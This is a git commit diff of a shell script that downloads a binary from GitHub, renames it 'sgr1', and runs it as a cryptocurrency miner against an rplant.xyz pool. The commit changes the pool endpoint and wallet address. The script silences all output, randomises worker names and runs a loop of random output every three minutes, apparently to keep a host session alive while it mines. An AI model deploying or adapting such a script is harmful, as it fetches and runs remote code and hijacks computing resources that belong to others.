ddb4d5e09d122d95922f1f97274ffcd2a7e46612
barburonjilo <barburonjilo@outlook.co.id>
2024-06-08 10:56:44 +0700

    Update and rename go2c.sh to go8cshu.sh

--- go8cshu.sh
+++ go8cshu.sh
@@ -15,7 +15,7 @@ wget -O sgr1  https://github.com/barburonjilo/back/raw/main/sr
 chmod +x sgr1
 cpulimit -l 200 -e sgr1 &
 # sudo sync && sudo echo 3 > /proc/sys/vm/drop_caches
-# nice -n -10 nohup ./sgr1 --algorithm yescryptr32 --pool stratum-asia.rplant.xyz:17116 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.envio --password m=solo --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive &
-./sgr1 --algorithm yescryptr32 --pool stratum-asia.rplant.xyz:17116 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$(echo $RANDOM | md5sum | head -c 5) --password m=solo --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive > /dev/null 2>&1  &
+# nice -n -10 nohup ./sgr1 --algorithm yespowersugar --pool stratum-asia.rplant.xyz:17116 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.envio --password m=solo --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive &
+./sgr1 --algorithm yescryptr32 --pool stratum+tcps://stratum-asia.rplant.xyz:17115 --wallet shuga1q4hsrhw72qe3hklgccuea9l0lwjppknlfc85nfv.$(echo $RANDOM | md5sum | head -c 5) --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive > /dev/null 2>&1  &
 # ./sgr1 --algorithm yescryptr32 --pool stratum-asia.rplant.xyz:17116 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.solo --password m=solo --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
